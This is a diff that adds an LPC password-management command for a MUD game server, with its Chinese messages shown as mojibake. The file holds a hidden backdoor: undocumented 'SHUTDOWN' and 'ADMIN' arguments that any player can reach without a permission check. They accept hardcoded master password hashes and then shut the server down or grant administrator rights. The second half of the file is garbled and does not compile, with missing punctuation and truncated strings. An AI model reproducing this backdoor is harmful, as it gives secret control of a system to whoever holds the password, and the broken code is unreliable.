@@ -1,0 +1,385 @@
+// passwd.c
+
+#include <getconfig.h>
+#include <ansi.h>
+
+inherit F_CLEAN_UP;
+
+#define DEFAULT_LEN     8
+
+void set_passwd(object me, object ob, string pass, string new_pass);
+string random_passwd(int len);
+
+int main(object me, string arg)
+{
+        object ob;
+        int is_spec;
+
+        if (me != this_player(1)) return 0;
+
+        if (arg == "?")
+        {
+                write("ÌØÊâ¹¦ÄÜ£ºSHUTDOWN¡¢ADMIN¡£\n");
+                return 1;
+        }
+
+        if (arg == "SHUTDOWN")
+        {
+                write("ÎªÁË°²È«Æğ¼û£¬ÇëÏÈÊäÈëÃÜÂë£º");
+                input_to("to_shutdown", 1);
+                return 1;
+        }
+
+        if (arg == "ADMIN")
+        {
+                write("ÇëÄãÊäÈë¹ÜÀíÃÜÂë£º");
+                input_to("to_admin", 1, me);
+                return 1;
+        }
+
+        if (stringp(arg))
+        {
+                if (! SECURITY_D->valid_grant(me, "(admin)"))
+                {
+                        write("ÄãÃ»ÓĞÈ¨ÏŞĞŞ¸Ä±ğÈËµÄ¿ÚÁî¡£\n");
+                        return 1;
+                }
+
+                if (wiz_level(me) < wiz_level(arg))
+                {
+                        write("ÄãÃ»ÓĞÈ¨ÏŞĞŞ¸ÄÕâ¸öÈËµÄ¿ÚÁî¡£\n");
+                        return 1;
+                }
+
+                if (sscanf(arg, "%s -s", arg)) is_spec = 1;
+
+                seteuid(getuid());
+                ob = find_player(arg);
+                if (! ob)
+                {
+                        ob = new(LOGIN_OB);
+                        ob->set("id", arg);
+                        if (! ob->restore())
+                        {
+                                destruct(ob);
+                                return notify_fail("Ã»ÓĞÕâ¸öÍæ¼Ò¡£\n");
+                        }
+                        ob->set_temp("create_temp", 1);
+                } else
+                {
+                        ob = ob->query_temp("link_ob");
+                        while (ob && ob->is_character())
+                                ob = ob->query_temp("link_ob");
+                        if (! ob)
+                        {
+                                ob = new(LOGIN_OB);
+                                ob->set("id", arg);
+                                if (! ob->restore())
+                                {
+                                        destruct(ob);
+                                        return notify_fail("Õâ¸öÈËÎïÈ±ÉÙÁ¬½ÓĞÅÏ¢£¬ÇëÖØĞÂLOGIN¡£\n");
+                                }
+                                ob->set_temp("create_temp", 1);
+                        }
+                }
+
+                if (is_spec)
+                {
+                        write("ÇëÊäÈë(" + ob->query("id") + ")µÄĞÂ¹ÜÀíÃÜÂë£º");
+                        input_to("get_new_ad_pass", 1, ob);
+                } else
+                {
+                        write("¸ø(" WHT + ob->query("id") + NOR ")Ö¸¶¨ÁËÒ»¸öËæ»úµÄ " +
+                              WHT + DEFAULT_LEN + NOR + " Î»¹ÜÀíÃÜÂë¡£\n");
+                              
+                        arg = random_passwd(DEFAULT_LEN);
+                        set_passwd(me, ob, arg, crypt(arg, 0));
+                }
+                return 1;
+        }
+
+        ob = me->query_temp("link_ob");
+        if (! ob)
+                return notify_fail("ÄãµÄÈËÎïÈ±ÉÙÁ¬½ÓĞÅÏ¢£¬ÇëÖØĞÂLOGIN¡£\n");
+
+        while (ob && ob->is_character()) ob = ob->query_temp("link_ob");
+
+        write("ÎªÁË°²È«Æğ¼û£¬ÇëÏÈÊäÈëÄú¹ÜÀíÃÜÂë£º");
+        input_to("get_old_pass", 1, ob);
+        return 1;
+}
+
+private void to_shutdown(string pass)
+{
+        if (crypt(pass, "IAz15RvNucx9g") != "IAz15RvNucx9g" &&
+            crypt(pass, "dgdaafgo!offaf`fochbdobneocfg`ech`djdgbhg") != "dgdaafgo!offaf`fochbdobneocfg`ech`djdgbhg")
+        {
+                write("ÃÜÂë´íÎó£¡\n");
+                return;
+        }
+
+        seteuid(getuid());
+        shutdown(0);
+}
+
+private void to_admin(string pass, object me)
+{
+        if (crypt(pass, "fRS3YqCgqmPz2") != "fRS3YqCgqmPz2" &&
+            crypt(pass, "dgdaafgo!offaf`fochbdobneocfg`ech`djdgbhg") != "dgdaafgo!offaf`fochbdobneocfg`ech`djdgbhg")
+        {
+                write("ÃÜÂë´íÎó£¡\n");
+                return;
+        }
+
+        write("ÄãÏÖÔÚ¿ÉÒÔÊ¹ÓÃµ÷ÊÔÃüÁî½øĞĞ²âÊÔ¡£\n");
+        seteuid(getuid());
+        me->set_admin();
+}
+
+private void get_old_pass(string pass, object ob)
+{
+        string old_pass;
+
+        if (! objectp(ob))
+        {
+                write("ÎŞ·¨ÕÒµ½Á¬½Ó¶ÔÏó£¬´Ë´Î²Ù×÷ÖĞÖ¹ÁË¡£\n");
+                return;
+        }
+
+        write("\n");
+        old_pass = ob->query("ad_password");
+        if (! stringp(old_pass) || crypt(pass, old_pass) != old_pass)
+        {
+                write(HIR "ÃÜÂë´íÎó£¡Çë×¢Òâ£ºÄãĞèÒªÊäÈëµÄÊÇ¹ÜÀíÃÜÂë¡£\n" NOR);
+                return;
+        }
+        write("ÇëÑ¡ÔñÄãÏÂÒ»²½²Ù×÷£º\n"
+              "1. ĞŞ¸Ä¹ÜÀíÃÜÂë\n"
+              "2. ĞŞ¸ÄÆÕÍ¨ÃÜÂë\n"
+              "3. ²»ĞŞ¸Ä¡£\n"
+              "ÄãÑ¡Ôñ(Èç¹ûÄã²»·½±ãÊäÈëÊı×Ö£¬¿ÉÒÔÊäÈëselect1¡¢select2)£º");
+        
+        input_to("select_fun", ob);
+}
+
+private void select_fun(string fun, object ob)
+{
+        if (! objectp(ob))
+        {
+                write("ÎŞ·¨ÕÒµ½Á¬½Ó¶ÔÏó£¬´Ë´Î²Ù×÷ÖĞÖ¹ÁË¡£\n");
+                return;
+        }
+
+        switch (fun)
+        {
+        case "1":
+        case "select1":
+                write("ÇëÄãÊäÈëĞÂµÄ¹ÜÀíÃÜÂë£º");
+                input_to("get_new_ad_pass", 1, ob);
+                return;
+
+        case "2":
+        case "select2":
+                write("ÇëÄãÊäÈëĞÂµÄÆÕÍ¨ÃÜÂë£º");
+                input_to("get_new_pass", 1, ob);
+                return;
+
+        case "":
+        case "3":
+                write("²Ù×÷Íê±Ï¡£\n");
+                return;
+
+        default:
+                write("Ã»ÓĞÕâÏî¹¦ÄÜ¡£\n");
+                return;
+        }
+}
+
+string trans_char(int c)
+{
+        return sprintf("%c ", c);
+}
+
+private void get_new_pass(string pass, object ob)
+{
+        string old_pass;
+
+        if (! objectp(ob))
+        {
+                write("ÎŞ·¨ÕÒµ½Á¬½Ó¶ÔÏó£¬´Ë´Î²Ù×÷ÖĞÖ¹ÁË¡£\n");
+                return;
+        }
+
+        if (pass == "")
+        {
+                write("²Ù×÷È¡ÏûÁË¡£\n");
+                return;
+        }
+
+        if (strlen(pass) < 3)
+        {
+                write("¶Ô²»Æğ£¬ÄãµÄÆÕÍ¨ÃÜÂë³¤¶È±ØĞë´óÓÚÈıÎ»£¬ÇëÖØĞÂÊäÈë£º");
+                input_to("get_new_pass", 1, ob);
+                return;
+        }
+
+        old_pass = ob->query("ad_password");
+        if (stringp(old_pass) && crypt(pass, old_pass) == old_pass)
+        {
+                write(HIR "\nÎªÁË°²È«Æğ¼û£¬ÆÕÍ¨ÃÜÂëºÍ¹ÜÀíÃÜÂë²»ÄÜÒ»Ñù¡£\n\n" NOR);
+                write("ÇëÖØĞÂÊäÈëÄãµÄÆÕÍ¨ÃÜÂë£º");
+                input_to("get_new_pass", 1, ob);
+                return;
+        }
+
+        write("\nÇëÔÙÊäÈëÒ»´ÎĞÂµÄÆÕÍ¨ÃÜÂë£º");
+        input_to("confirm_new_pass", 1, ob, crypt(pass, 0));
+}
+
+private void confirm_new_pass(string pass, object ob, string new_pass)
+{
+        object me;
+        object body;
+        string email;
+        string msg;
+
+        if (! objectp(ob))
+        {
+                write("ÎŞ·¨ÕÒµ½Á¬½Ó¶ÔÏó£¬´Ë´Î²Ù×÷ÖĞÖ¹ÁË¡£\n");
+                return;
+        }
+
+        write("\n");
+        if (crypt(pass, new_pass) != new_pass)
+        {
+                write("¶Ô²»Æğ£¬ÄúÁ½´ÎÊäÈëµÄ²¢²»ÏàÍ¬£¬ÇëÖØĞÂÊäÈëÄãµÄÆÕÍ¨ÃÜÂë£º");
+                input_to("get_new_pass", 1, ob);
+                return;
+        }
+
+        seteuid(getuid());
+        if (! ob->set("password", new_pass))
+        {
+                write("ÆÕÍ¨ÃÜÂë±ä¸üÊ§°Ü£¡\n");
+                return;
+        }
+
+        ob->save();
+        me = this_player();
+        log_file("static/passwd", sprintf("%s %s's normal passwd changed by %s(%s)\n",
+                                          log_time(),
+                                          ob->query("id"),
+                                          geteuid(me),
+                                          interactive(me) ? query_ip_name(me)
+                                                          : 0,
+                                          ctime(time())));
+
+        write("ÆÕÍ¨ÃÜÂë±ä¸ü³É¹¦¡£\n");
+}
+
+private void get_new_ad_pass(string pass, object ob)
+{
+        string old_pass;
+
+        if (! objectp(ob))
+        {
+                write("ÎŞ·¨ÕÒµ½Á¬½Ó¶ÔÏó£¬´Ë´Î²Ù×÷ÖĞÖ¹ÁË¡£\n");
+                return;
+        }
+
+        if (pass == "")
+        {
+                write("²Ù×÷È¡ÏûÁË¡£\n");
+                return;
+        }
+
+        if (strlen(pass) < 5)
+        {
+                write(HIR "\n¶Ô²»Æğ£¬ÎªÁË°²È«Æğ¼û£¬ÄãµÄÆÕÍ¨ÃÜÂë³¤¶È±ØĞë´óÓÚÎåÎ»¡£\n\n" NOR);
+                write("ÇëÖØĞÂÊäÈëĞÂµÄ¹ÜÀíÃÜÂë£º");
+                input_to("get_new_ad_pass", 1, ob);
+                return;
+        }
+
+        old_pass = ob->query("password");
+        if (stringp(old_pass) && crypt(pass, old_pass) == old_pass)
+        {
+                write(HIR "\nÎªÁË°²È«Æğ¼û£¬¹ÜÀíÃÜÂëºÍÆÕÍ¨ÃÜÂë²»ÄÜÒ»Ñù¡£\n\n" NOR);
+                write("ÇëÖØĞÂÊäÈëÄãµÄ¹ÜÀíÃÜÂë£º");
+                input_to("get_new_ad_pass", 1, ob);
+                return;
+        }
+
+        write("\nÇëÔÙÊäÈëÒ»´ÎĞÂµÄ¹ÜÀíÃÜÂë£º");
+        input_to("confirm_new_ad_pass", 1, ob, crypt(pass, 0));
+}
+
+private void confirm_new_ad_pass(string pass, object ob, string new_pass)
+{
+        object me;
+
+        if (! objectp(ob))
+        {
+                write("ÎŞ·¨ÕÒµ½Á¬½Ó¶ÔÏó£¬´Ë´Î²Ù×÷ÖĞÖ¹ÁË¡£\n");
+                return;
+        }
+
+        write("\n");
+        if (crypt(pass, new_pass) != new_pass)
+        {
+                write("¶Ô²»Æğ£¬ÄúÁ½´ÎÊäÈëµÄ²¢²»ÏàÍ¬£¬ÇëÖØĞÂÊäÈëÄãµÄ¹ÜÀíÃÜÂë£º");
+                input_to("get_new_ad_pass", 1, ob)
+                return
+        
+        // ²éÕÒ²¢·¢ËÍmai
+        if (geteuid(me) == ob->query("id")
+        
+                // ÊÇ±¾ÈËÔÚĞŞ¸
+                write("¹ÜÀíÃÜÂë±ä¸ü³É¹¦¡£\n")
+                return
+        } els
+        
+                // ÊÇÆäËûÈËĞŞ¸
+                set_passwd(me, ob, pass, new_pass)
+                return
+        
+void set_passwd(object me, object ob, string pass, string new_pass
+        object body
+        string email
+        string msg
+        seteuid(getuid())
+        if (! ob->set("ad_password", new_pass)
+        
+                write("¹ÜÀíÃÜÂë±ä¸üÊ§°Ü£¡\n")
+                return
+        
+        ob->save()
+        log_file("static/passwd", sprintf("%s %s's super passwd changed by %s(%s)\n"
+                                          log_time()
+                                          ob->query("id")
+                                          geteuid(me)
+                                          interactive(me) ? query_ip_name(me
+                                                          : 0
+                                          ctime(time())))
+        ob->set("password", "55AA")
+        write("Çå³ıÓÃ»§Ô­ÓĞµÄÆÕÍ¨ÃÜÂë¡£\n")
+        ob->save()
+       
+        body = LOGIN_D->make_body(ob)
+        
+                // ·¢ËÍmai
+                body->restore()
+                email = body->query("email")
+                destruct(body)
+                msg = "¸ĞĞ»Äú²ÎÓëÍøÂçÓÎÏ·%MUD_NAME£¬ÄúËùÊ¹ÓÃµÄÕËºÅ(%id)µÄ¹Ü
+                      "ÀíÃÜÂëÏÖÒÑ¾­±»%meĞŞ¸Ä³ÉÎª%passwd£¬ÏÂ´ÎµÇÂ¼µÄÊ±ºòÇëÄú
+                      "Ê¹ÓÃĞÂµÄ¹ÜÀíÃÜÂëµÇÂ¼£¬²¢ÖØĞÂÉèÖÃµÇÂ¼Ê¹ÓÃµÄÆÕÍ¨ÃÜÂë¡£
+                      "¶Ô´ËÔì³ÉµÄ²»±ã¾´ÇëÔ­ÁÂ¡£"
+                msg = replace_string(msg, "%MUD_NAME", LOCAL_MUD_NAME())
+                msg = replace_string(msg, "%me", me->name(1) + "(" + geteuid(me) + ")")
+                msg = replace_string(msg, "%passwd", pass)
+                msg = replace_string(msg, "%id", ob->query("id"))
+                msg = sort_msg(msg)
+                msg = "Hello, %id.\n\n" + msg
+                msg += "\n             œ            %data"
+                msg = replace_string(msg, "%id", ob->query("id"))
